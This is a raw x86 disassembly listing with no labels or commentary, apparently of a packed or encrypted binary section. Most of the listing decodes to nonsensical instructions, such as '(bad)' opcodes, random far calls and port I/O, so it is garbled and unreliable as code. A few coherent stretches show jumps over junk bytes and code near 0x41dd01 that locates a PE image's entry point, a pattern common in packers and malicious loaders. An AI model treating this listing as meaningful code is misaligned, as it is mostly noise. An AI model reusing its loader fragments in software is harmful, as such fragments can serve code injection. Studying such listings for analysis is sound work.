  41d766:	test   al,0x7a
  41d768:	push   0xbbee615b
  41d76d:	jb     0x41d7cd
  41d76f:	icebp  
  41d770:	or     al,bh
  41d772:	retf   0xcfe8
  41d775:	gs mov ah,0x19
  41d778:	loop   0x41d7c9
  41d77a:	adc    eax,0xd05c3ccf
  41d77f:	popf   
  41d780:	pop    ecx
  41d781:	fwait
  41d782:	cwde   
  41d783:	popa   
  41d784:	adc    eax,0x18308218
  41d789:	dec    esi
  41d78a:	sti    
  41d78b:	aaa    
  41d78c:	push   es
  41d78d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d78e:	mov    esp,0xa5983549
  41d793:	ss in  al,dx
  41d795:	aam    0xd4
  41d797:	push   ecx
  41d798:	stc    
  41d799:	aaa    
  41d79a:	popa   
  41d79b:	push   0xc2329a05
  41d7a0:	jp     0x41d749
  41d7a2:	sub    al,0xbb
  41d7a4:	arpl   WORD PTR [ecx+0x28793dff],dx
  41d7aa:	in     eax,0xb3
  41d7ac:	out    dx,eax
  41d7ad:	inc    esp
  41d7ae:	pushf  
  41d7af:	int    0xfe
  41d7b1:	retf   
  41d7b2:	aaa    
  41d7b3:	xchg   BYTE PTR [esi+0x25],dh
  41d7b6:	aam    0xe8
  41d7b8:	xor    al,0x26
  41d7ba:	fs cld 
  41d7bc:	jp     0x41d797
  41d7be:	addr16 jae 0x41d7aa
  41d7c1:	pusha  
  41d7c2:	adc    DWORD PTR [edx+0x1fa16834],ebp
  41d7c8:	jmp    esp
  41d7ca:	ror    DWORD PTR ds:0xf1788675,1
  41d7d0:	fcom   QWORD PTR [ebx]
  41d7d2:	jecxz  0x41d7d4
  41d7d4:	call   0x780c:0x7eb1853b
  41d7db:	dec    esp
  41d7dc:	sub    eax,0x493368f4
  41d7e1:	int3   
  41d7e2:	ds sub eax,0x671f22f1
  41d7e8:	loop   0x41d81a
  41d7ea:	fisubr WORD PTR [eax-0x1b]
  41d7ed:	and    edi,DWORD PTR [ebp-0x72]
  41d7f0:	dec    ebx
  41d7f1:	xor    dl,0x8c
  41d7f4:	jmp    0x11638099
  41d7f9:	ins    DWORD PTR es:[edi],dx
  41d7fa:	cdq    
  41d7fb:	xchg   ebx,eax
  41d7fc:	sub    esi,edi
  41d7fe:	jnp    0x41d83a
  41d800:	(bad)  [eax+0x6317e953]
  41d806:	mov    bh,0xe
  41d808:	pushf  
  41d809:	fisub  WORD PTR [esp+eax*2]
  41d80c:	rcl    DWORD PTR [edx-0x21fccb60],cl
  41d812:	push   edi
  41d813:	outs   dx,BYTE PTR ds:[esi]
  41d814:	jne    0x41d7e9
  41d816:	(bad)  
  41d817:	jp     0x41d875
  41d819:	mov    dh,0x81
  41d81b:	adc    al,BYTE PTR [edx-0x47]
  41d81e:	push   edi
  41d81f:	shl    BYTE PTR [eax],1
  41d821:	arpl   WORD PTR [eax+0x301535d6],dx
  41d827:	in     al,0x9c
  41d829:	mov    WORD PTR [ebp+0x7b62d391],?
  41d82f:	cmp    esp,DWORD PTR ds:0x6d5fd3b
  41d835:	push   ds
  41d836:	lock mov ch,0x8b
  41d839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d83a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d83b:	mov    ds:0x447286,al
  41d840:	jge    0x41d7d1
  41d842:	add    DWORD PTR [ebp+0x51],ebx
  41d845:	xchg   esp,eax
  41d846:	mov    bh,0xcd
  41d848:	lods   eax,DWORD PTR ds:[esi]
  41d849:	sub    BYTE PTR [ebx-0x25f16794],al
  41d84f:	call   0xdc71:0x6ac96a54
  41d856:	add    BYTE PTR [ecx],0xf2
  41d859:	dec    ebx
  41d85a:	add    ah,bh
  41d85c:	sar    DWORD PTR [ebp-0x10b2a42f],0xb
  41d863:	xchg   BYTE PTR [ecx+ebp*8+0x1f],cl
  41d867:	data16 mov BYTE PTR gs:[ebp-0x47],dh
  41d86c:	scas   al,BYTE PTR es:[edi]
  41d86d:	imul   esp,esi,0xbf218c2a
  41d873:	fmul   DWORD PTR [edx+0x20]
  41d876:	cmp    bl,dl
  41d878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d879:	mov    WORD PTR [eax+0x3d],gs
  41d87c:	add    al,0x3a
  41d87e:	icebp  
  41d87f:	or     al,0xe
  41d881:	outs   dx,DWORD PTR ds:[esi]
  41d882:	mov    al,0xba
  41d884:	aam    0xf0
  41d886:	mov    eax,ds:0x636c5d70
  41d88b:	int3   
  41d88c:	scas   eax,DWORD PTR es:[edi]
  41d88d:	lods   eax,DWORD PTR ds:[esi]
  41d88e:	or     dh,BYTE PTR [eax-0x1a]
  41d891:	mov    BYTE PTR [ebp+eax*8+0xdb0258b],bl
  41d898:	fidiv  WORD PTR [eax]
  41d89a:	loop   0x41d85a
  41d89c:	and    al,0x8c
  41d89e:	sbb    ebx,DWORD PTR [edi-0x55]
  41d8a1:	xor    dl,BYTE PTR [eax]
  41d8a3:	xchg   edi,eax
  41d8a4:	sub    ebp,DWORD PTR [eax]
  41d8a6:	push   eax
  41d8a7:	push   ss
  41d8a8:	xchg   ebx,eax
  41d8a9:	and    DWORD PTR [esi-0x79],esp
  41d8ac:	dec    ebx
  41d8ad:	stc    
  41d8ae:	or     al,0x38
  41d8b0:	stc    
  41d8b1:	sahf   
  41d8b2:	inc    eax
  41d8b3:	test   DWORD PTR [ebx-0x6d],0x48182c7e
  41d8ba:	and    al,0xf6
  41d8bc:	aas    
  41d8bd:	scas   al,BYTE PTR es:[edi]
  41d8be:	cmp    bh,BYTE PTR [eax+0x1a]
  41d8c1:	out    0xcc,eax
  41d8c3:	sahf   
  41d8c4:	int3   
  41d8c5:	aas    
  41d8c6:	add    al,0x7e
  41d8c8:	pop    edx
  41d8c9:	std    
  41d8ca:	mov    ds:0xe3bc9aa2,eax
  41d8cf:	stos   BYTE PTR es:[edi],al
  41d8d0:	shl    BYTE PTR [edx+0x5a],cl
  41d8d3:	sub    al,0x39
  41d8d5:	aad    0x91
  41d8d7:	jae    0x41d90a
  41d8d9:	enter  0xe406,0x86
  41d8dd:	xchg   ecx,eax
  41d8de:	jbe    0x41d951
  41d8e0:	dec    ecx
  41d8e1:	call   0x246b3216
  41d8e6:	fwait
  41d8e7:	mov    ebp,0x97b7e240
  41d8ec:	fcom   DWORD PTR [ebp-0x27cacfad]
  41d8f2:	les    ecx,FWORD PTR [ecx+0x3d0ff5c3]
  41d8f8:	ins    BYTE PTR es:[edi],dx
  41d8f9:	cmp    bh,BYTE PTR [eax+0x2fc73709]
  41d8ff:	outs   dx,BYTE PTR ds:[esi]
  41d900:	xor    eax,0xc31186e8
  41d905:	pop    esi
  41d906:	shl    ah,cl
  41d908:	mov    edx,DWORD PTR [esp+0x18]
  41d90c:	mov    edi,DWORD PTR [esp+0x1c]
  41d910:	add    eax,edx
  41d912:	adc    ecx,edi
  41d914:	mov    DWORD PTR [esp+0x18],eax
  41d918:	mov    DWORD PTR [esp+0x1c],ecx
  41d91c:	jmp    0x41d926
  41d921:	mov    ebx,0xca79a575
  41d926:	push   0x4
  41d928:	push   0x422518
  41d92d:	jmp    0x41dcfc
  41d932:	mov    cl,0x3a
  41d934:	cdq    
  41d935:	lahf   
  41d936:	bound  ebx,QWORD PTR [edx-0x24cc5e1]
  41d93c:	mov    ds:0x1240b9bc,eax
  41d941:	stos   BYTE PTR es:[edi],al
  41d942:	jg     0x41d991
  41d944:	push   ss
  41d945:	sbb    BYTE PTR [edx+edx*1-0x42bee7e8],bh
  41d94c:	push   es
  41d94d:	sub    DWORD PTR [edx+0x53],edx
  41d950:	int    0xd5
  41d952:	push   edi
  41d953:	out    0x79,al
  41d955:	(bad)  [edi+eiz*8-0xa71eb61]
  41d95c:	jnp    0x41d9a6
  41d95e:	jge    0x41d912
  41d960:	inc    ecx
  41d961:	sbb    eax,DWORD PTR [esi-0x57a64680]
  41d967:	out    dx,eax
  41d968:	das    
  41d969:	std    
  41d96a:	or     al,0xaf
  41d96c:	mov    esi,esp
  41d96e:	inc    ebp
  41d96f:	stc    
  41d970:	jne    0x41d975
  41d972:	fcomp  st(5)
  41d974:	pop    edi
  41d975:	xchg   ecx,eax
  41d976:	idiv   BYTE PTR [edx-0x7e37e0a7]
  41d97c:	cmp    eax,0x101bec5
  41d981:	nop
  41d982:	loop   0x41d97e
  41d984:	fimul  WORD PTR [ecx]
  41d986:	not    DWORD PTR [ebp-0x5d618f67]
  41d98c:	xchg   esi,eax
  41d98d:	inc    ebp
  41d98e:	push   0x4f8672df
  41d993:	jmp    0x41d938
  41d995:	mov    ecx,0xcf60996e
  41d99a:	(bad)  
  41d99b:	fistp  DWORD PTR [ecx]
  41d99d:	xlat   BYTE PTR ds:[ebx]
  41d99e:	push   ss
  41d99f:	js     0x41d9e2
  41d9a1:	jns    0x41d955
  41d9a3:	int3   
  41d9a4:	(bad)  
  41d9a5:	jecxz  0x41da14
  41d9a7:	arpl   WORD PTR [eax+0x64ca7fbf],cx
  41d9ad:	popf   
  41d9ae:	mov    eax,ds:0x41bedad1
  41d9b3:	jnp    0x41d9cf
  41d9b5:	mov    eax,ds:0xbbec8203
  41d9ba:	pop    ss
  41d9bb:	arpl   ax,bp
  41d9bd:	fs push ebx
  41d9bf:	jmp    0x4137c7d7
  41d9c4:	mov    ebp,0xaf76ee16
  41d9c9:	enter  0x8a0d,0x94
  41d9cd:	dec    esp
  41d9ce:	and    esi,DWORD PTR [ebx]
  41d9d0:	sub    ecx,esp
  41d9d2:	hlt    
  41d9d3:	cwde   
  41d9d4:	icebp  
  41d9d5:	cs dec ecx
  41d9d7:	test   BYTE PTR [esi-0x1b],bh
  41d9da:	rol    BYTE PTR [eax-0x22acd253],0xe5
  41d9e1:	in     eax,0xcf
  41d9e3:	sbb    BYTE PTR [eax+0x55d8b77e],0xe8
  41d9ea:	jne    0x41da60
  41d9ec:	cli    
  41d9ed:	test   DWORD PTR [ecx],edx
  41d9ef:	in     al,0xd9
  41d9f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9f2:	in     eax,0xd3
  41d9f4:	cmc    
  41d9f5:	lock pop esp
  41d9f7:	mov    dl,0x43
  41d9f9:	dec    edi
  41d9fa:	shr    BYTE PTR [edx+0x3d43666e],cl
  41da00:	pop    eax
  41da01:	fstp   QWORD PTR [edi-0x4c]
  41da04:	xchg   edx,eax
  41da05:	outs   dx,BYTE PTR ds:[esi]
  41da06:	pop    edx
  41da07:	sub    al,bl
  41da09:	fs push esp
  41da0b:	(bad)  
  41da0c:	in     al,dx
  41da0d:	fwait
  41da0e:	div    DWORD PTR [edi]
  41da10:	fxch   st(7)
  41da12:	jo     0x41da11
  41da14:	xchg   edx,eax
  41da15:	adc    eax,0x9e71c00b
  41da1a:	cmp    al,0x6f
  41da1c:	cmp    DWORD PTR [edx-0x729fe7ad],edx
  41da22:	xchg   DWORD PTR [ebx-0x425d6332],esi
  41da28:	fnstcw WORD PTR [esi-0x10d761b]
  41da2e:	gs retf 0xab9a
  41da32:	in     eax,0x33
  41da34:	outs   dx,BYTE PTR ds:[esi]
  41da35:	daa    
  41da36:	div    BYTE PTR [ebx-0x35]
  41da39:	mov    ecx,0x54aeb0be
  41da3e:	add    al,0x10
  41da40:	inc    ecx
  41da41:	sub    al,0x1f
  41da43:	and    edi,DWORD PTR [ebx-0x41962561]
  41da49:	adc    al,0x26
  41da4b:	scas   eax,DWORD PTR es:[edi]
  41da4c:	xchg   edi,eax
  41da4d:	pop    ecx
  41da4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da4f:	push   0xedf184bb
  41da54:	js     0x41d9d9
  41da56:	sbb    ah,BYTE PTR [edx+0x12]
  41da59:	pusha  
  41da5a:	stc    
  41da5b:	jg     0x41da6c
  41da5d:	inc    ebp
  41da5e:	sub    BYTE PTR ds:0x4f8c060,ah
  41da64:	mov    edx,DWORD PTR [edx+0x2a]
  41da67:	add    esi,edi
  41da69:	pusha  
  41da6a:	loope  0x41da02
  41da6c:	enter  0xf958,0x56
  41da70:	bound  ebx,QWORD PTR [ebx]
  41da72:	pop    ss
  41da73:	sahf   
  41da74:	mov    dl,BYTE PTR [edx+esi*4+0x60]
  41da78:	mov    al,ds:0xdaa35552
  41da7d:	mov    esp,0x9675ce84
  41da82:	call   0xf81:0x2bbd291a
  41da89:	sub    cl,0x7a
  41da8c:	call   FWORD PTR [ebx]
  41da8e:	outs   dx,BYTE PTR ds:[esi]
  41da8f:	je     0x41dad7
  41da91:	(bad)  
  41da92:	fiadd  WORD PTR [edi]
  41da94:	ret    
  41da95:	push   es
  41da96:	mov    WORD PTR [eax-0x57],ss
  41da99:	hlt    
  41da9a:	in     al,0x29
  41da9c:	aam    0x64
  41da9e:	jecxz  0x41dada
  41daa0:	loop   0x41dae9
  41daa2:	and    BYTE PTR [ebp+0x39],ah
  41daa5:	aas    
  41daa6:	push   edi
  41daa7:	xchg   esi,eax
  41daa8:	jno    0x41dabd
  41daaa:	cs test al,0xbe
  41daad:	cmc    
  41daae:	dec    esi
  41daaf:	add    bh,BYTE PTR [ebp-0x6eb3be63]
  41dab5:	xchg   ecx,eax
  41dab6:	jmp    0xf2bf:0xdce518d2
  41dabd:	pop    ebx
  41dabe:	dec    eax
  41dabf:	rol    DWORD PTR [edx+0x3f49f4dd],1
  41dac5:	test   BYTE PTR [ebx-0x44ec5214],bh
  41dacb:	ds aaa 
  41dacd:	das    
  41dace:	clc    
  41dacf:	jecxz  0x41da82
  41dad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dad2:	and    al,0x1f
  41dad4:	test   DWORD PTR [ebx+ebx*4+0x42],eax
  41dad8:	jne    0x41dac8
  41dada:	(bad)  
  41dadb:	call   0xc0ab:0xf961f5c0
  41dae2:	mov    DWORD PTR [ebx],ecx
  41dae4:	push   0xfa606d2f
  41dae9:	lds    ecx,FWORD PTR [eax]
  41daeb:	mov    BYTE PTR [edi-0x1e],cl
  41daee:	jns    0x41da94
  41daf0:	pop    ds
  41daf1:	dec    edx
  41daf2:	jbe    0x41dad4
  41daf4:	sbb    eax,0xcb59118b
  41daf9:	es pop edi
  41dafb:	arpl   WORD PTR [ecx+ebx*2+0x15],cx
  41daff:	cmp    ecx,DWORD PTR ds:0x27bb4874
  41db05:	pop    esp
  41db06:	or     ebx,DWORD PTR [ebp+edx*2-0x42]
  41db0a:	jbe    0x41db2e
  41db0c:	adc    BYTE PTR [ebx+0x5c3a9d4b],ah
  41db12:	xchg   ecx,eax
  41db13:	loopne 0x41db1d
  41db15:	clc    
  41db16:	jbe    0x41db6a
  41db18:	pop    ebx
  41db19:	adc    eax,0x130e4148
  41db1e:	jb     0xb838feda
  41db24:	(bad)  
  41db26:	jb     0x41daf6
  41db28:	fs cmp bl,ch
  41db2b:	jbe    0x41dba3
  41db2d:	outs   dx,BYTE PTR ds:[esi]
  41db2e:	mov    DWORD PTR [ebp+0x3a],esi
  41db31:	clc    
  41db32:	mov    esp,0xe78954fe
  41db37:	popa   
  41db38:	aad    0xc7
  41db3a:	mov    edx,0x237f8df1
  41db3f:	dec    eax
  41db40:	(bad)  
  41db42:	retf   0x70b
  41db45:	outs   dx,BYTE PTR ds:[esi]
  41db46:	xchg   al,ah
  41db48:	pop    edx
  41db49:	sub    BYTE PTR ds:0xc8860c18,bh
  41db4f:	imul   ebx,DWORD PTR [eax-0xb],0x5c
  41db53:	pop    ecx
  41db54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db55:	xchg   ebp,eax
  41db56:	iret   
  41db57:	imul   ebx,esi,0x1c
  41db5a:	aaa    
  41db5b:	adc    ecx,ecx
  41db5d:	cli    
  41db5e:	or     bh,dh
  41db60:	loope  0x41daf4
  41db62:	fcmovnb st,st(6)
  41db64:	cwde   
  41db65:	xchg   esp,eax
  41db66:	ss jae 0x41db50
  41db69:	into   
  41db6a:	jbe    0x41db67
  41db6c:	xchg   edx,eax
  41db6d:	or     edx,edi
  41db6f:	in     al,dx
  41db70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db71:	push   ebx
  41db72:	aas    
  41db73:	or     al,0xa6
  41db75:	add    eax,0x5a0a5221
  41db7a:	js     0x41dba2
  41db7c:	(bad)  
  41db7d:	cmc    
  41db7e:	sub    DWORD PTR [eax-0x35],ecx
  41db81:	pop    edx
  41db82:	in     al,dx
  41db83:	aaa    
  41db84:	dec    ecx
  41db85:	dec    ecx
  41db86:	jns    0x41dba7
  41db88:	cli    
  41db89:	or     ebp,DWORD PTR [eax]
  41db8b:	adc    BYTE PTR [ebx],ch
  41db8d:	daa    
  41db8e:	add    DWORD PTR [ebp-0x3b12c00f],eax
  41db94:	xchg   ebp,eax
  41db95:	mov    edi,0x9d7ef6a9
  41db9a:	aas    
  41db9b:	mov    edx,0x1f45e14f
  41dba0:	test   BYTE PTR [ebx+0x63],0x50
  41dba4:	(bad)  
  41dba5:	push   esp
  41dba6:	ins    DWORD PTR es:[edi],dx
  41dba7:	loope  0x41db57
  41dba9:	pusha  
  41dbaa:	pop    ebx
  41dbab:	jne    0x41dc27
  41dbad:	out    0x54,al
  41dbaf:	das    
  41dbb0:	jecxz  0x41dbd3
  41dbb2:	adc    al,0x55
  41dbb4:	mov    al,es:0xf48e7dcb
  41dbba:	ins    DWORD PTR es:[edi],dx
  41dbbb:	jbe    0x41db76
  41dbbd:	retf   
  41dbbe:	adc    DWORD PTR [edi-0x20],ecx
  41dbc1:	pop    ebx
  41dbc2:	xor    bl,cl
  41dbc4:	pop    edx
  41dbc5:	sub    esi,DWORD PTR [eax-0x371ecd79]
  41dbcb:	mov    dh,0x2a
  41dbcd:	mov    esi,0x3b5cbca
  41dbd2:	call   0x7285:0xfa3c9750
  41dbd9:	pop    edi
  41dbda:	add    eax,0xd1f8e800
  41dbdf:	sbb    ch,BYTE PTR [edx-0x45]
  41dbe2:	jo     0x41db65
  41dbe4:	in     al,dx
  41dbe5:	cli    
  41dbe6:	push   cs
  41dbe7:	xor    ebp,ebp
  41dbe9:	xchg   esp,eax
  41dbea:	test   DWORD PTR [eax],ebp
  41dbec:	imul   esp,DWORD PTR [eax-0x27],0x5d
  41dbf0:	xchg   esi,eax
  41dbf1:	icebp  
  41dbf2:	loopne 0x41dbb8
  41dbf4:	mov    esp,0x97b28cdb
  41dbf9:	(bad)  
  41dbfa:	push   ebx
  41dbfb:	pop    es
  41dbfc:	jl     0x41db9b
  41dbfe:	mul    BYTE PTR [edx-0x3]
  41dc01:	or     BYTE PTR [ebx-0x4b397b3f],0xc0
  41dc08:	push   eax
  41dc09:	mov    ch,0xa6
  41dc0b:	aad    0x1b
  41dc0d:	int3   
  41dc0e:	(bad)  
  41dc0f:	sti    
  41dc10:	sub    eax,0x62e77c84
  41dc15:	push   es
  41dc16:	pop    ebp
  41dc17:	pop    ebp
  41dc18:	fucomi st,st(4)
  41dc1a:	jp     0x41dbdb
  41dc1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc1d:	neg    BYTE PTR [eax+0xdaa4484]
  41dc23:	ins    BYTE PTR es:[edi],dx
  41dc24:	popa   
  41dc25:	retf   0xdc66
  41dc28:	stc    
  41dc29:	mov    ebx,ecx
  41dc2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc2c:	mov    esp,0x9b6c20e3
  41dc31:	adc    DWORD PTR [eax+edx*8+0x72],edx
  41dc35:	xchg   cl,dh
  41dc37:	and    eax,0xa3fc7049
  41dc3c:	jbe    0x41dc6c
  41dc3e:	aaa    
  41dc3f:	mov    bh,0x22
  41dc41:	push   ecx
  41dc42:	xor    bh,dh
  41dc44:	outs   dx,BYTE PTR ds:[esi]
  41dc45:	test   DWORD PTR [ebp-0x69],esp
  41dc48:	xchg   edx,eax
  41dc49:	sub    esi,ecx
  41dc4b:	mov    ebx,0xae510fd1
  41dc50:	sbb    al,0x67
  41dc52:	cmp    edx,DWORD PTR [edx+ebx*1]
  41dc55:	pop    esp
  41dc56:	fcmove st,st(0)
  41dc58:	rcr    ah,1
  41dc5a:	les    ecx,FWORD PTR [eax+0x69c93f03]
  41dc60:	push   esp
  41dc61:	xor    al,0xec
  41dc63:	call   0xa2ad:0x2dc89351
  41dc6a:	in     eax,dx
  41dc6b:	ins    DWORD PTR es:[edi],dx
  41dc6c:	cs mov bh,0xb3
  41dc6f:	mov    dl,0xa4
  41dc71:	mov    ecx,DWORD PTR [edx]
  41dc73:	fs mov al,0xbb
  41dc76:	xor    BYTE PTR [edi*4+0x2fb4d2a3],ch
  41dc7d:	les    esp,FWORD PTR [ecx-0x15]
  41dc80:	pop    edi
  41dc81:	test   DWORD PTR [edi-0x5d4d50f6],esp
  41dc87:	jbe    0x41dc27
  41dc89:	xlat   BYTE PTR ds:[ebx]
  41dc8a:	pop    ecx
  41dc8b:	sub    edx,DWORD PTR ds:0xcf92f0c2
  41dc91:	pop    edx
  41dc92:	pop    ebp
  41dc93:	ins    BYTE PTR es:[edi],dx
  41dc94:	cli    
  41dc95:	rcl    BYTE PTR [edi-0x7ab5c1a3],cl
  41dc9b:	sub    eax,0x3e641322
  41dca0:	(bad)  
  41dca1:	loop   0x41dc4c
  41dca3:	push   eax
  41dca4:	ret    
  41dca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dca6:	iret   
  41dca7:	cld    
  41dca8:	xchg   esp,eax
  41dca9:	jae    0x41dc46
  41dcab:	inc    edx
  41dcac:	push   esp
  41dcad:	das    
  41dcae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcaf:	mov    WORD PTR [edi+eiz*4+0x17],es
  41dcb3:	hlt    
  41dcb4:	xor    BYTE PTR [edx+0x65],0x95
  41dcb8:	add    BYTE PTR [ebx+0xe245050],0xb0
  41dcbf:	mov    dh,dh
  41dcc1:	popf   
  41dcc2:	xchg   ebx,eax
  41dcc3:	popa   
  41dcc4:	lods   eax,DWORD PTR ds:[esi]
  41dcc5:	pusha  
  41dcc6:	in     eax,dx
  41dcc7:	ds jmp 0x52694e91
  41dccd:	fisubr WORD PTR [eax]
  41dccf:	scas   al,BYTE PTR es:[edi]
  41dcd0:	dec    ebp
  41dcd1:	sbb    eax,0x3d0840a0
  41dcd6:	out    dx,al
  41dcd7:	jo     0x41dce6
  41dcd9:	push   0x56
  41dcdb:	inc    ecx
  41dcdc:	dec    eax
  41dcdd:	pop    ds
  41dcde:	cmp    ah,BYTE PTR [esi+0x6e]
  41dce1:	dec    ebx
  41dce2:	mov    ds:0xa64347fc,al
  41dce7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dce9:	sbb    ah,BYTE PTR [ebx]
  41dceb:	dec    edx
  41dcec:	adc    ah,BYTE PTR [esi+0x6f]
  41dcef:	in     eax,0x6a
  41dcf1:	mov    ds:0x668d1318,eax
  41dcf6:	pop    ss
  41dcf7:	cmp    dh,dh
  41dcf9:	cld    
  41dcfa:	pop    edi
  41dcfb:	ror    DWORD PTR [ebp+0x506c2444],1
  41dd01:	call   0x415231
  41dd06:	mov    eax,DWORD PTR [esp+0x64]
  41dd0a:	push   0x4
  41dd0c:	push   DWORD PTR [eax+0x1a4]
  41dd12:	lea    eax,[esp+0x74]
  41dd16:	push   eax
  41dd17:	call   0x415231
  41dd1c:	mov    eax,DWORD PTR [esp+0x64]
  41dd20:	mov    eax,DWORD PTR [eax+0x1a4]
  41dd26:	mov    eax,DWORD PTR [eax]
  41dd28:	mov    ecx,DWORD PTR [esp+0x64]
  41dd2c:	mov    eax,DWORD PTR [eax+0x3c]
  41dd2f:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41dd35:	mov    ecx,DWORD PTR [ecx]
  41dd37:	lea    eax,[ecx+eax*1+0x28]
  41dd3b:	mov    eax,DWORD PTR [eax]
  41dd3d:	add    DWORD PTR [esp+0x6c],eax
  41dd41:	mov    DWORD PTR [esp+0x30],0x127
  41dd49:	jmp    0x41e118
  41dd4e:	dec    edi
  41dd4f:	inc    eax
  41dd50:	mov    ds:0x3a6ba279,al
  41dd55:	push   ds
  41dd56:	(bad)  
  41dd57:	push   edx
  41dd59:	push   0xffffff85
  41dd5b:	sub    DWORD PTR [ebx+0x164722bc],edx
  41dd61:	sbb    BYTE PTR [edx+edx*1+0x1b111818],bh
  41dd68:	add    bl,bh
  41dd6a:	push   ds
  41dd6b:	and    al,0xfc
  41dd6d:	add    BYTE PTR [edx+0x112f8df9],dl
  41dd73:	and    ebx,DWORD PTR [ebx+eax*2+0x70]
  41dd77:	or     DWORD PTR [edi+ebp*4-0x2fd4155b],0x1e
  41dd7f:	pop    es
  41dd80:	fucomp st(2)
  41dd82:	sbb    DWORD PTR [edi],ebx
  41dd84:	ja     0x41dd16
  41dd86:	sbb    eax,0x1d5dcc76
  41dd8b:	cmp    eax,0x273c9f62
  41dd90:	retf   0x621a
  41dd93:	leave  
  41dd94:	stc    
  41dd95:	sbb    DWORD PTR [edi+0x6b],edx
  41dd98:	xor    bh,BYTE PTR [edi+0x3411f3a8]
  41dd9e:	(bad)  
  41dd9f:	jnp    0x41dd40
  41dda1:	pushf  
  41dda2:	dec    ebx
  41dda3:	loopne 0x41ddbc
  41dda5:	dec    edi
  41dda6:	push   eax
  41dda7:	adc    BYTE PTR [edi-0x76de4ab6],bh
  41ddad:	mov    esp,0xf8deb42b
  41ddb2:	mov    dl,0xd
  41ddb4:	(bad)  
  41ddb5:	mov    ah,0x8d
  41ddb7:	mov    edx,DWORD PTR [edx]
  41ddb9:	dec    ebx
  41ddba:	add    BYTE PTR [edi],bh
  41ddbc:	aam    0x2e
  41ddbe:	cmp    DWORD PTR ds:0x35ae1dca,0x41d352db
  41ddc8:	daa    
  41ddc9:	ror    DWORD PTR [edx],1
  41ddcb:	and    BYTE PTR [esi],ah
  41ddcd:	fldcw  WORD PTR cs:[edx+0x787936e4]
  41ddd4:	mov    al,BYTE PTR [esi-0xd]
  41ddd7:	ja     0x41dd5f
  41ddd9:	jae    0x41dd73
  41dddb:	mov    cl,0x14
  41dddd:	push   ds
  41ddde:	xchg   esi,eax
  41dddf:	cmp    DWORD PTR [esi+ebx*1+0x6ec6ed1c],ecx
  41dde6:	pop    ds
  41dde7:	(bad)  
  41dde8:	sbb    eax,0x925dba3f
  41dded:	push   ss
  41ddee:	dec    esi
  41ddef:	sub    esi,DWORD PTR [ecx+0x3c2cf937]
  41ddf5:	push   cs
  41ddf6:	and    al,0xff
  41ddf8:	dec    BYTE PTR [edi]
  41ddfa:	jmp    0x41de0b
  41ddfc:	ja     0x41ddb1
  41ddfe:	add    ah,bh
  41de00:	jmp    0x41dd99
  41de02:	and    edx,esi
  41de04:	or     al,0x72
  41de06:	mov    ebx,0x27ce71fb
  41de0b:	xchg   esp,eax
  41de0c:	push   edi
  41de0d:	jecxz  0x41de6e
  41de0f:	xchg   ebx,eax
  41de10:	mov    esp,DWORD PTR [ebx]
  41de12:	repz xchg esp,eax
  41de14:	(bad)  
  41de15:	stos   BYTE PTR es:[edi],al
  41de16:	cmp    esi,DWORD PTR [ecx]
  41de18:	jle    0x41dde5
  41de1a:	cmp    eax,0x152fe8b1
  41de1f:	adc    al,0xec
  41de21:	out    dx,al
  41de22:	cmc    
  41de23:	repnz (bad) 
  41de27:	fst    DWORD PTR [esi+0x45]
  41de2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de2b:	cmp    ah,ah
  41de2d:	xchg   BYTE PTR [ecx],al
  41de2f:	sar    DWORD PTR [edi],0x47
  41de32:	popf   
  41de33:	enter  0xf93b,0x6c
  41de37:	mov    ebx,DWORD PTR [edi]
  41de39:	sub    al,0xce
  41de3b:	inc    ecx
  41de3c:	jne    0x41deb8
  41de3e:	jmp    0x41dde9
  41de40:	jmp    0x2541c007
  41de45:	test   DWORD PTR [edi],ebp
  41de47:	push   ebx
  41de48:	call   0x980d:0x499b7957
  41de4f:	test   al,0xcd
  41de51:	push   cs
  41de52:	mov    ds:0x15b92f76,eax
  41de57:	(bad)  
  41de58:	jecxz  0x41de00
  41de5a:	adc    edx,DWORD PTR [ebx-0x70]
  41de5d:	sbb    BYTE PTR [ecx+0x362baa66],dl
  41de63:	and    eax,0xc6b27f2
  41de68:	adc    DWORD PTR [edx-0x5e],esi
  41de6b:	lods   eax,DWORD PTR ds:[esi]
  41de6c:	dec    ebx
  41de6d:	mov    cl,0x6d
  41de6f:	xchg   ebx,eax
  41de70:	mov    eax,ds:0xeca708dd
  41de75:	inc    esi
  41de76:	dec    edi
  41de77:	int    0x21
  41de79:	stos   DWORD PTR es:[edi],eax
  41de7a:	sub    cl,BYTE PTR [ecx+0x229e33c7]
  41de80:	loope  0x41dee8
  41de82:	repnz sbb ecx,ecx
  41de85:	mov    ds:0x7f562f4f,al
  41de8a:	pop    esi
  41de8b:	ins    DWORD PTR es:[edi],dx
  41de8c:	aaa    
  41de8d:	(bad)  
  41de8f:	xor    eax,0xba77f052
  41de94:	mov    edi,0xdce0c4b5
  41de99:	div    BYTE PTR [esi+edi*8]
  41de9c:	cmp    DWORD PTR [edx+esi*4],esi
  41de9f:	adc    edi,eax
  41dea1:	(bad)  
  41dea3:	test   eax,0x1fbb224e
  41dea8:	pop    edi
  41dea9:	into   
  41deaa:	add    BYTE PTR [ebp-0xb63df98],ch
  41deb0:	add    DWORD PTR [edx-0x702de000],eax
  41deb6:	fwait
  41deb7:	jp     0x41dee9
  41deb9:	and    eax,ebp
  41debb:	or     eax,DWORD PTR [ecx+0x7ebc4e16]
  41dec1:	es int3 
  41dec3:	sub    BYTE PTR [eax],ch
  41dec5:	call   0x16d28dab
  41deca:	sub    edx,DWORD PTR [edi+0x68b62495]
  41ded0:	push   ss
